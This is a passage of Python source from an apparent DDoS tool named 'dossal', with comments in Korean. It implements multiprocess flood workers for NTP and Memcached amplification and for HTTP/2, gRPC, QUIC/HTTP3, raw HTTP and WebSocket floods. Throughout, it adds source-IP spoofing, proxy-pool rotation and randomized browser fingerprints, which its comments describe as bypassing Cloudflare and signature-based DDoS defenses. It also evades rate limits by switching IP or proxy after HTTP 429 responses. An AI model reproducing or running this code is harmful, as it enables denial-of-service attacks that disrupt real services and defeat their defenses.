# ── NTP amplification: mon_list (UDP 123) ───────────────────────
def _mp_ntp_flood(args_tuple):
    """멀티프로세스 NTP mon_list 패킷: 증폭 공격."""
    import time as _time
    import random as _rnd
    import struct as _struct
    host, port, duration, src_ip = args_tuple
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    if src_ip:
        try:
            sock.bind((src_ip, 0))
        except OSError:
            pass
    
    # NTP mon_list request: LI=3, VN=3, Mode=3, seq=0, stratum=0, poll=0, precision=0, root_delay=0, root_dispersion=0, ref_id=0
    ntp_header = _struct.pack('!BHHIIIII', 0b11011011, 0, 0, 0, 0, 0, 0, 0)
    sent = 0
    end = _time.time() + duration
    while _time.time() < end:
        n = 5000
        try:
            for _ in range(n):
                # NTP client: LI=3, VN=3, Mode=3 (client)
                ntp_req = _struct.pack('!BHHIIIII', 0b11011011, 0, 0, 0, 0, 0, 0, 0)
                sock.sendto(ntp_req, (host, port))
            sent += n
        except Exception:
            break
    sock.close()
    return sent

async def ntp_worker(name, url, stats, duration, stop, payload_size=0):
    """NTP amplification 워커: UDP NTP monlist 쿼리 폭주"""
    host, port = parse_udp(url)
    n_procs = max(1, min(8, _UDP_NPROCS[0]))
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = []
    for i in range(n_procs):
        src_ip = _get_src_ip(i, n_procs) if _SPOOF_MODE[0] and _SRC_IPS[0] else None
        targets.append((host, port, duration, src_ip))
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_ntp_flood, targets)
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [0] * n_procs
    total = sum(results) if isinstance(results, list) else results
    stats.packets += total
    stats.bytes += total * 48

# ── Memcached amplification: GET request (UDP 11211) ───────────
def _mp_memcached_flood(args_tuple):
    """멀티프로세스 Memcached GET 패킷: 증폭 공격."""
    import time as _time
    import random as _rnd
    host, port, duration, src_ip = args_tuple
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    if src_ip:
        try:
            sock.bind((src_ip, 0))
        except OSError:
            pass
    
    # Memcached GET request: "get key\r\n"
    keys = ['key1', 'key2', 'user:1001', 'session:abc', 'cache:item', 'data:xyz',
            'token:12345', 'config:main', 'stats:count', 'temp:tmp']
    sent = 0
    end = _time.time() + duration
    while _time.time() < end:
        n = 5000
        try:
            for _ in range(n):
                key = _rnd.choice(keys)
                memcached_req = f"get {key}\r\n".encode()
                sock.sendto(memcached_req, (host, port))
            sent += n
        except Exception:
            break
    sock.close()
    return sent

async def memcached_worker(name, url, stats, duration, stop, payload_size=0):
    """Memcached amplification 워커: UDP get 폭주"""
    host, port = parse_udp(url)
    n_procs = max(1, min(8, _UDP_NPROCS[0]))
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = []
    for i in range(n_procs):
        src_ip = _get_src_ip(i, n_procs) if _SPOOF_MODE[0] and _SRC_IPS[0] else None
        targets.append((host, port, duration, src_ip))
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_memcached_flood, targets)
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [0] * n_procs
    total = sum(results) if isinstance(results, list) else results
    stats.packets += total
    stats.bytes += total * 20

# ── H2 multiprocess: raw socket + h2 frames ─────────────────────
def _mp_h2_flood(args_tuple):
    """멀티프로세스 H2 전송 (1개 H2 연결, 배치 요청)
    
    v12.6: 프록시 + 소스 IP 바인딩 지원 추가
    """
    import time as _time
    import ssl as _ssl
    import socket as _socket
    import random as _rnd
    from h2.connection import H2Connection
    from h2.config import H2Configuration
    from h2.events import DataReceived
    host, port, path, duration, streams = args_tuple[:5]
    # v12.6: optional args
    src_ip = args_tuple[5] if len(args_tuple) > 5 else None
    proxy = args_tuple[6] if len(args_tuple) > 6 else None
    sent = 0
    errors = 0
    h2_429 = 0
    try:
        ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE
        ctx.set_alpn_protocols(['h2'])
        raw = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
        raw.settimeout(5.0)
        raw.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
        raw.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
        
        # v12.6: 프록시 지원
        proxy = _PROXY[0]
        if proxy:
            from urllib.parse import urlparse as _up
            p = _up(proxy)
            p_host = p.hostname
            p_port = p.port or 8080
            raw.connect((p_host, p_port))
            # HTTP CONNECT
            connect_req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n"
            raw.sendall(connect_req.encode())
            resp = b""
            while b"\r\n\r\n" not in resp:
                chunk = raw.recv(4096)
                if not chunk:
                    break
                resp += chunk
            if b"200" not in resp.split(b"\r\n")[0]:
                raw.close()
                return 0, 1
        else:
            # v12.6: 소스 IP 바인딩
            if src_ip:
                try:
                    raw.bind((src_ip, 0))
                except OSError:
                    pass
            raw.connect((host, port))
        
        ssock = ctx.wrap_socket(raw, server_hostname=host)
        
        # h2 connection
        config = H2Configuration(client_side=True)
        conn = H2Connection(config=config)
        conn.initiate_connection()
        ssock.sendall(conn.data_to_send())
        # Wait for server SETTINGS
        try:
            data = ssock.recv(8192)
            conn.receive_data(data)
        except Exception:
            pass
        
        # Randomized headers
        uas = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Firefox/121.0',
        ]
        paths = [path, '/', '/index.html', '/api', '/static/app.js']
        
        end = _time.time() + duration
        while _time.time() < end:
            try:
                # Send a batch of concurrent streams
                for _ in range(min(streams, 100)):
                    stream_id = conn.get_next_available_stream_id()
                    headers = [
                        (':method', 'GET'),
                        (':scheme', 'https'),
                        (':authority', host),
                        (':path', _rnd.choice(paths)),
                        ('user-agent', _rnd.choice(uas)),
                        ('accept', 'text/html,*/*'),
                        ('sec-fetch-dest', 'document'),
                        ('sec-fetch-mode', 'navigate'),
                    ]
                    conn.send_headers(stream_id, headers, end_stream=True)
                data = conn.data_to_send()
                _t_send = _time.time()
                if data:
                    ssock.sendall(data)
                sent += min(streams, 100)
                # Drain responses
                deadline = _time.time() + 0.5
                while _time.time() < deadline:
                    try:
                        ssock.settimeout(0.05)
                        chunk = ssock.recv(65535)
                        if not chunk:
                            break
                        events = conn.receive_data(chunk)
                        for event in events:
                            if isinstance(event, DataReceived):
                                pass  # just drain
                    except _socket.timeout:
                        break
                # v8.1/v8.2: 적응형 공격 - 응답 시간 측정 + RPS 조절 + 실제 sleep
                _t_recv = _time.time()
                if _ADAPTIVE[0]:
                    _resp_ms = (_t_recv - _t_send) * 1000.0
                    _adaptive_adjust(_resp_ms, _t_recv)
                    # v8.2: rps_mult로 실제 sleep
                    _mult = _ADAPTIVE_STATE['rps_mult']
                    if _mult < 0.95:
                        _sleep_time = (1.0 / _mult - 1.0) * 0.001
                        _time.sleep(min(_sleep_time, 0.5))
            except Exception:
                break
        ssock.close()
    except Exception:
        errors += 1
    return sent, errors, h2_429

async def h2mp_worker(name, url, stats, duration, stop, payload_size=1024):
    """HTTP/2 멀티프로세스 공격 워커: N개 프로세스, 각각 1개 H2 연결
    
    v12.6: 소스 IP 바인딩 + 프록시 지원
    """
    host, port, path = parse_http(url)
    n_procs = max(1, min(16, _UDP_NPROCS[0]))
    # Each process: 100 concurrent streams
    streams = 100
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    # v12.6: 각 프로세스에 소스 IP + 프록시 전달
    proxy = _PROXY[0]
    targets = []
    for i in range(n_procs):
        src_ip = _get_src_ip(i, n_procs) if _SPOOF_MODE[0] and _SRC_IPS[0] else None
        targets.append((host, port, path, duration, streams, src_ip, proxy))
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_h2_flood, targets)
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0, 0)] * n_procs
    for sent, errs, h429 in results:
        stats.requests += sent
        stats.errors += errs
    stats.conns += n_procs

# ── gRPC worker: HTTP/2 + gRPC framing ──────────────────────────
def _mp_grpc_flood(args_tuple):
    """멀티프로세스 gRPC 패킷: 자식 프로세스에서 TLS + H2 + gRPC 프레임."""
    import time as _time
    import ssl as _ssl
    import socket as _socket
    host, port, path, duration, payload_size = args_tuple
    from h2.connection import H2Connection
    from h2.config import H2Configuration
    from h2.events import DataReceived

    sent = 0
    errors = 0
    try:
        ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE
        ctx.set_alpn_protocols(['h2'])
        raw = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
        raw.settimeout(5.0)
        raw.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
        raw.connect((host, port))
        ssock = ctx.wrap_socket(raw, server_hostname=host)
        
        config = H2Configuration(client_side=True)
        conn = H2Connection(config=config)
        conn.initiate_connection()
        ssock.sendall(conn.data_to_send())
        # Read server preface
        data = ssock.recv(8192)
        conn.receive_data(data)
        
        headers = [
            (':method', 'POST'),
            (':scheme', 'https'),
            (':authority', host),
            (':path', path),
            ('content-type', 'application/grpc'),
            ('te', 'trailers'),
            ('user-agent', 'dossal/3.15'),
        ]
        grpc_payload = b'X' * max(1, payload_size)
        payload = b'\x00' + len(grpc_payload).to_bytes(4, 'big') + grpc_payload
        
        end = _time.time() + duration
        while _time.time() < end:
            try:
                stream_id = conn.get_next_available_stream_id()
                conn.send_headers(stream_id, headers, end_stream=False)
                conn.send_data(stream_id, payload, end_stream=True)
                data = conn.data_to_send()
                if data:
                    ssock.sendall(data)
                sent += 1
                # Drain responses
                try:
                    chunk = ssock.recv(65535)
                    if chunk:
                        conn.receive_data(chunk)
                except Exception:
                    pass
            except Exception:
                break
        ssock.close()
    except Exception:
        errors += 1
    return sent, errors

async def grpc_mp_worker(name, url, stats, duration, stop, payload_size=1024):
    """gRPC 멀티프로세스 공격 워커"""
    host, port, path = parse_http(url)
    n_procs = max(1, min(32, _UDP_NPROCS[0]))
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, path, duration, payload_size)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_grpc_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0)] * n_procs
    for sent, errs in results:
        stats.requests += sent
        stats.errors += errs
    stats.conns += n_procs

async def grpc_worker(name, url, stats, duration, stop, payload_size=1024):
    """gRPC L7 공격 워커: HTTP/2 기반 gRPC 요청 폭주"""
    host, port, path = parse_http(url)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(['h2'])
    reader, writer = await asyncio.open_connection(host, port, ssl=ctx)
    config = H2Configuration(client_side=True)
    conn = H2Connection(config=config)
    conn.initiate_connection()
    writer.write(conn.data_to_send())
    await writer.drain()
    try:
        data = await asyncio.wait_for(reader.read(8192), timeout=2.0)
        conn.receive_data(data)
    except Exception:
        pass
    
    # gRPC headers
    headers = [
        (':method', 'POST'),
        (':scheme', 'https'),
        (':authority', host),
        (':path', path),
        ('content-type', 'application/grpc'),
        ('te', 'trailers'),
        ('user-agent', f'dossal/{VERSION}'),
    ]
    # gRPC request frame: 1-byte flag + 4-byte length + payload
    grpc_payload = b'X' * max(1, payload_size)
    payload = b'\x00' + len(grpc_payload).to_bytes(4, 'big') + grpc_payload
    # Fire-and-forget: batch gRPC requests, drain in background
    reader_task = asyncio.create_task(_grpc_reader(conn, reader, stats))
    BATCH = 1
    error = None
    while not stop.is_set():
        try:
            for _ in range(BATCH):
                if stop.is_set():
                    break
                stream_id = conn.get_next_available_stream_id()
                conn.send_headers(stream_id, headers, end_stream=False)
                conn.send_data(stream_id, payload, end_stream=True)
            data = conn.data_to_send()
            if data:
                writer.write(data)
                await asyncio.wait_for(writer.drain(), timeout=5.0)
            stats.requests += BATCH
            stats.bytes += BATCH * len(payload)
        except Exception as e:
            stats.errors += 1
            error = e
            break
    reader_task.cancel()
    if writer.transport:
        writer.transport.abort()

async def _grpc_reader(conn, reader, stats):
    """백그라운드 리더: H2 프레임 배수 (연결 유지)."""
    try:
        while True:
            chunk = await reader.read(8192)
            if not chunk:
                break
            events = conn.receive_data(chunk)
            for event in events:
                if isinstance(event, DataReceived):
                    stats.bytes += len(event.data)
    except Exception:
        pass

# ── QUIC/HTTP3 worker: raw UDP with QUIC-like framing ───────────
def _mp_quic_send(args_tuple):
    """멀티프로세스 QUIC/UDP 패킷 전송"""
    host, port, duration, payload_size = args_tuple
    import time as _time
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    payload = b'\xc0' + b'\x00' * 4 + b'\x00' * 8 + (b'X' * min(payload_size, 1200))
    sent = 0
    end = _time.time() + duration
    while _time.time() < end:
        n = 2000
        try:
            for _ in range(n):
                sock.sendto(payload, (host, port))
            sent += n
        except Exception:
            break
    sock.close()
    return sent

async def quic_worker(name, url, stats, duration, stop, payload_size=1400):
    """QUIC/UDP L4 공격 워커: 멀티프로세스 UDP 패킷 폭주"""
    host, port = parse_udp(url)
    n_procs = _UDP_NPROCS[0]
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, duration, payload_size)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_quic_send, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [0] * n_procs
    total = sum(results) if isinstance(results, list) else results
    plen = min(payload_size, 1200) + 13  # QUIC header + payload
    stats.packets += total
    stats.bytes += total * plen

def _mp_h3_send(args_tuple):
    """멀티프로세스 HTTP/3 전송 (QUIC Initial + H3 SETTINGS + GET)"""
    import socket as _socket
    import time as _time
    import os as _os
    import random as _rnd
    host, port, duration = args_tuple
    
    s = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
    s.settimeout(1.0)
    
    # QUIC Initial packet header (long header, version 1)
    # First byte: 0xC3 (long header, v1, DCID len=8)
    # Version: 0x00000001 (QUIC v1)
    # DCID: 8 random bytes
    # SCID: 4 random bytes
    # Packet number: 4 bytes
    # Payload: H3 SETTINGS + GET frame
    
    # H3 SETTINGS frame (type 0x04, length, then settings)
    h3_settings = bytes([0x04, 0x00, 0x00]) + b'\x00' * 8  # minimal SETTINGS
    
    # H3 GET request (type 0x00 HEADERS frame)
    # Simplified: HEADERS frame with GET / HTTP/3
    h3_get = bytes([0x00, 0x0a]) + b'GET / HTTP/3\r\n\r\n'
    
    # Build QUIC Initial packet
    dcid = _os.urandom(8)
    scid = _os.urandom(4)
    pn = 0
    # Long header: form(1)+fixed(1)+type(1)+lkf(1) = 0xC3
    # Version: 0x00000001
    # DCID len(1) + DCID(8)
    # SCID len(1) + SCID(4)
    # Packet number len(1) + PN(4)
    quic_header = bytes([0xC3, 0x00, 0x00, 0x00, 0x01]) + bytes([8]) + dcid + bytes([4]) + scid
    payload = h3_settings + h3_get
    pkt = quic_header + bytes([4]) + _rnd.getrandbits(32).to_bytes(4, 'big') + payload
    
    end = _time.time() + duration
    sent = 0
    BATCH = 100
    while _time.time() < end:
        try:
            for _ in range(BATCH):
                # Randomize packet number
                pn_bytes = _rnd.getrandbits(32).to_bytes(4, 'big')
                pkt2 = pkt[:-len(payload)] + pn_bytes + payload
                s.sendto(pkt2, (host, port))
            sent += BATCH
        except Exception:
            break
    s.close()
    return sent

async def h3mp_worker(name, url, stats, duration, stop, payload_size=1400):
    """HTTP/3 (h3) 멀티프로세스 워커: QUIC Initial + H3 프레임 폭주"""
    host, port = parse_udp(url)
    n_procs = max(1, min(32, _UDP_NPROCS[0]))
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, duration)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_h3_send, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [0] * n_procs
    total = sum(results) if isinstance(results, list) else results
    stats.packets += total
    stats.bytes += total * 100  # approx H3 packet size

# ── Raw HTTP: multiprocess raw socket (max RPS) ───────────────────
def _random_http_req(host, path):
    """랜덤화 HTTP 요청 생성 (path/UA/headers 랜덤, 시그니처 DDoS 방어 우회)"""
    import random as _rnd
    # Random path variation: /, /index.html, /api/v1, /static/app.js, etc.
    paths = [path, '/', '/index.html', '/api', '/static/main.js', '/css/style.css',
             '/favicon.ico', '/health', '/status', '/api/v1/data', '/assets/app.abc123.js']
    rpath = _rnd.choice(paths)
    # Random query string
    qs = f"?_={_rnd.randint(100000,999999)}" if _rnd.random() < 0.5 else ""
    # Random User-Agent
    uas = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
        'dossal/' + VERSION,
    ]
    ua = _rnd.choice(uas)
    # Random Accept header
    accept = _rnd.choice([
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'application/json',
        'text/plain,*/*',
    ])
    # Random Accept-Language
    lang = _rnd.choice(['en-US,en;q=0.9', 'ko-KR,ko;q=0.9', 'ja-JP,ja;q=0.9', 'de-DE,de;q=0.9'])
    
    # Build request with random header order
    headers = {
        'Host': host,
        'User-Agent': ua,
        'Accept': accept,
        'Accept-Language': lang,
        'Connection': 'keep-alive',  # raw multiproc needs keep-alive
    }
    if _rnd.random() < 0.3:
        headers['Accept-Encoding'] = 'gzip, deflate, br'
    if _rnd.random() < 0.2:
        headers['Referer'] = f'http://{host}/'
    
    # Cloudflare bypass: sec-fetch-*, sec-ch-ua, consistent browser headers
    sec_ch_ua = _rnd.choice([
        '"Chromium";v="120", "Google Chrome";v="120", "Not_A Brand";v="24"',
        '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        '"Chromium";v="119", "Not?A_Brand";v="24"',
        '"Chromium";v="121", "Google Chrome";v="121"',
    ])
    headers['sec-ch-ua'] = sec_ch_ua
    headers['sec-ch-ua-mobile'] = '?0'
    headers['sec-ch-ua-platform'] = _rnd.choice(['"Windows"', '"macOS"', '"Linux"'])
    headers['Sec-Fetch-Dest'] = 'document'
    headers['Sec-Fetch-Mode'] = 'navigate'
    headers['Sec-Fetch-Site'] = _rnd.choice(['none', 'same-origin', 'cross-site'])
    headers['Sec-Fetch-User'] = '?1'
    # Upgrade-Insecure-Requests (browsers send this)
    if _rnd.random() < 0.6:
        headers['Upgrade-Insecure-Requests'] = '1'
    # Accept-Encoding (vary)
    headers['Accept-Encoding'] = _rnd.choice(['gzip, deflate, br', 'gzip, deflate', 'gzip'])
    # If-Modified-Since (cache-buster variation)
    if _rnd.random() < 0.3:
        import time as _t
        ts = _t.time() - _rnd.randint(3600, 86400)
        from email.utils import formatdate
        headers['If-Modified-Since'] = formatdate(timeval=ts, usegmt=True)
    
    # Random header order (browsers don't always send in same order)
    hkeys = list(headers.keys())
    _rnd.shuffle(hkeys)
    header_str = ''.join(f"{k}: {headers[k]}\r\n" for k in hkeys)
    req = f"GET {rpath}{qs} HTTP/1.1\r\n{header_str}\r\n"
    return req.encode()

def _mp_http_send(args_tuple):
    """멀티프로세스 raw socket HTTP 전송 (429 감지 + IP 교체 + 프록시 프루)"""
    import time as _time
    if len(args_tuple) == 8:
        host, port, path, duration, src_ip, ip_pool, proxy, proxy_pool = args_tuple
    elif len(args_tuple) == 7:
        host, port, path, duration, src_ip, ip_pool, proxy = args_tuple
        proxy_pool = None
    else:
        host, port, path, duration, src_ip, ip_pool = args_tuple
        proxy = None
        proxy_pool = None
    # Pre-generate pool of 10 requests (fast cycling)
    # v5.0: Use browser fingerprint spoofing if enabled
    import random as _rnd
    _browser = _BROWSER[0]
    if _CACHE_BYPASS[0] or _browser != 'chrome':
        req_pool = [_spoofed_http_req(host, path, _browser) for _ in range(10)]
    else:
        req_pool = [_random_http_req(host, path) for _ in range(10)]
    req_idx = 0
    req_counter = 0
    REQ_REFRESH = 500  # Regenerate pool every 500 requests
    sent = 0
    errors = 0
    blocked = 0
    s = None
    cur_ip = src_ip
    cur_proxy = proxy  # Current proxy (tuples: (host, port))
    proxy_idx = 0  # Proxy pool index
    PROXY_ROTATE_EVERY = 50  # v5.1: 매 50개 요청마다 프록시 자동轮换
    req_since_rotate = 0  # Since last rotate
    end = _time.time() + duration
    while _time.time() < end:
        # Connect (or reconnect after 429/error)
        if s is None:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5.0)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                if cur_ip:
                    try:
                        s.bind((cur_ip, 0))
                    except OSError:
                        pass
                # Determine which proxy to use
                use_proxy = None
                if proxy_pool and len(proxy_pool) > 0:
                    # v5.0: Proxy pool mode - rotate on 429
                    use_proxy = proxy_pool[proxy_idx % len(proxy_pool)]
                elif cur_proxy:
                    use_proxy = cur_proxy
                if use_proxy:
                    # Connect through proxy (HTTP CONNECT tunnel)
                    if isinstance(use_proxy, tuple):
                        p_host, p_port = use_proxy
                    else:
                        from urllib.parse import urlparse as _up2
                        p = _up2(use_proxy)
                        p_host, p_port = p.hostname, p.port or 8080
                    s.connect((p_host, p_port))
                    connect_req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n".encode()
                    s.sendall(connect_req)
                    resp = s.recv(4096)
                    if b'200' not in resp:
                        s.close()
                        errors += 1
                        break
                else:
                    s.connect((host, port))
            except Exception:
                errors += 1
                break
        try:
            # Cycle through pre-generated pool (fast)
            req_counter += 1
            if req_counter % REQ_REFRESH == 0:
                req_pool = [_random_http_req(host, path) for _ in range(10)]
                req_idx = 0
            else:
                req_idx = (req_idx + 1) % 10
            req = req_pool[req_idx]
            if _JITTER[0] > 0:
                import random as _rj
                _time.sleep(_rj.uniform(0, _JITTER[0]))
            _t_send = _time.time()
            s.sendall(req)
            data = s.recv(65535)
            _t_recv = _time.time()
            if not data:
                break
            sent += 1
            # v5.2/v8.2: 적응형 공격 - 응답 시간 측정 + RPS 조절 + 실제 sleep
            if _ADAPTIVE[0]:
                _resp_ms = (_t_recv - _t_send) * 1000.0
                _adaptive_adjust(_resp_ms, _t_recv)
                # v8.2: rps_mult로 실제 sleep (0.5x = 2배 느리게)
                _mult = _ADAPTIVE_STATE['rps_mult']
                if _mult < 0.95:  # Only sleep if we're throttling
                    _sleep_time = (1.0 / _mult - 1.0) * 0.001  # Convert to seconds
                    _time.sleep(min(_sleep_time, 0.5))  # Max 500ms per request
            # v5.1: 매 N개 요청마다 프록시 자동轮换 (keep-alive 구간에서도)
            if proxy_pool and len(proxy_pool) > 0:
                req_since_rotate += 1
                if req_since_rotate >= PROXY_ROTATE_EVERY:
                    req_since_rotate = 0
                    proxy_idx += 1
                    s.close()
                    s = None
                    continue
            # 429 detection: this IP/proxy is blocked, switch to next
            if _RECOVERY[0] and data[:12].startswith(b'HTTP/1.1 429'):
                blocked += 1
                # v5.1: burst + backoff - 429를 5개 연속 받으면 0.5초간 대기
                # Cloudflare의 per-IP time-window rate limit 우회
                if blocked % 5 == 0 and blocked > 0:
                    _time.sleep(0.5)  # 500ms backoff
                # Rotate IP if IP pool available
                if ip_pool:
                    if cur_ip:
                        _BLOCKED_IPS.add(cur_ip)
                    active = [ip for ip in ip_pool if ip not in _BLOCKED_IPS]
                    if not active:
                        _BLOCKED_IPS.clear()
                        active = ip_pool[:]
                    cur_ip = active[0]
                # Rotate proxy if proxy pool available (v5.0)
                if proxy_pool and len(proxy_pool) > 0:
                    proxy_idx += 1
                s.close()
                s = None
        except Exception:
            break
    if s:
        try:
            s.close()
        except OSError: pass
    return sent, errors, blocked, cur_ip

async def _wait_pool(pool, async_result, timeout):
    """multiprocessing pool 결과 대기 (executor 기반)"""
    loop = asyncio.get_event_loop()
    import concurrent.futures
    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ded:
        try:
            results = await loop.run_in_executor(ded, async_result.get, timeout)
        except Exception:
            results = None
    pool.close()
    try:
        await loop.run_in_executor(None, pool.join)
    except Exception:
        pass
    return results

async def raw_worker(name, url, stats, duration, stop, payload_size=0):
    """Raw HTTP 멀티프로세스 워커: raw socket으로 최대 RPS"""
    host, port, path = parse_http(url)
    n_procs = max(1, min(32, _UDP_NPROCS[0]))
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    
    # Proxy (parsed once, passed to children)
    # v5.0: Use proxy pool if available, otherwise single proxy
    proxy = None
    proxy_pool = _PROXY_POOL  # type: ignore
    if proxy_pool:
        # Proxy pool mode: each process gets a different proxy (round-robin)
        pass  # proxy_pool is passed separately
    elif _PROXY[0]:
        try:
            from urllib.parse import urlparse as _up
            _pp = _up(_PROXY[0])
            proxy = (_pp.hostname, _pp.port or 8080)
        except Exception:
            proxy = None
    
    if proxy_pool:
        # v5.0: Proxy pool mode - each process gets a different proxy
        from urllib.parse import urlparse as _up
        targets = []
        for i in range(n_procs):
            # Round-robin proxy assignment
            p_idx = i % len(proxy_pool)
            try:
                p = _up(proxy_pool[p_idx])
                p_tuple = (p.hostname, p.port or 8080)
            except Exception:
                p_tuple = None
            src_ip = _get_src_ip(i, n_procs) if (_SPOOF_MODE[0] and _SRC_IPS[0]) else None
            targets.append((host, port, path, duration, src_ip, None, p_tuple, proxy_pool))
    elif _SPOOF_MODE[0] and _SRC_IPS[0]:
        # Spoofing + recovery mode: each process gets a different src IP
        ip_pool = list(_SRC_IPS[0])  # Pass full pool so recovery can pick next IP
        targets = []
        for i in range(n_procs):
            src_ip = _get_src_ip(i, n_procs)
            targets.append((host, port, path, duration, src_ip, ip_pool, proxy, None))
    else:
        targets = [(host, port, path, duration, None, None, proxy, None)] * n_procs
    
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_http_send, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0, 0, None)] * n_procs
    
    total_blocked = 0
    for r in results:
        if len(r) == 4:
            sent, errors, blocked, cur_ip = r
        else:
            sent, errors = r
            blocked = 0
        stats.requests += sent
        stats.errors += errors
        total_blocked += blocked
    stats.conns += n_procs
    if total_blocked > 0:
        print(f"[recovery] raw: {total_blocked} IPs blocked (429), {len(_BLOCKED_IPS)} total blocked", file=sys.stderr)

# ── WebSocket multiprocess: raw socket WS frame flood ────────────
def _mp_ws_flood(args_tuple):
    """멀티프로세스 WebSocket 패킷: 연결, 업그레이드, 프레임 전송."""
    import time as _time
    import struct as _struct
    import base64 as _b64
    import random as _rand
    host, port, path, duration, payload_size = args_tuple
    key = _b64.b64encode(_rand.randbytes(16)).decode()
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
           f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
           f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n").encode()
    msgs = 0
    errors = 0
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5.0)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((host, port))
        s.sendall(req)
        # Read handshake response
        resp = b""
        while b"\r\n\r\n" not in resp:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
        if b"101" not in resp:
            errors += 1
            s.close()
            return 0, errors
        # Build WS frame (text, masked)
        payload = b"x" * max(1, payload_size)
        plen = len(payload)
        if plen < 126:
            frame_header = b"\x81" + _struct.pack("!B", 0x80 | plen)
        else:
            frame_header = b"\x81" + _struct.pack("!BH", 0x80 | 126, plen)
        mask = _rand.randbytes(4)
        masked_payload = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
        frame = frame_header + mask + masked_payload
        frame_size = len(frame)
        # Send frames with periodic recv(discard) to keep TCP flow
        end = _time.time() + duration
        s.setblocking(False)
        import select as _select
        n = 0
        while _time.time() < end:
            try:
                # sendall in non-blocking mode: retry on BlockingIOError
                off = 0
                while off < frame_size:
                    try:
                        off += s.send(frame[off:])
                    except BlockingIOError:
                        # Wait for writable
                        _w, _, _ = _select.select([], [s], [], 0.01)
                        if not _w:
                            break
                if off >= frame_size:
                    msgs += 1
            except (BrokenPipeError, ConnectionResetError):
                break
            except Exception:
                break
            n += 1
            if n % 64 == 0:
                # Drain receive buffer
                try:
                    while True:
                        _r, _, _ = _select.select([s], [], [], 0)
                        if _r:
                            if not s.recv(4096):
                                break
                        else:
                            break
                except Exception:
                    break
        s.close()
    except Exception:
        errors += 1
    return msgs, errors

async def ws_mp_worker(name, url, stats, duration, stop, payload_size=128):
    """WebSocket 멀티프로세스 워커: N개 프로세스, 각각 1개 WS 연결"""
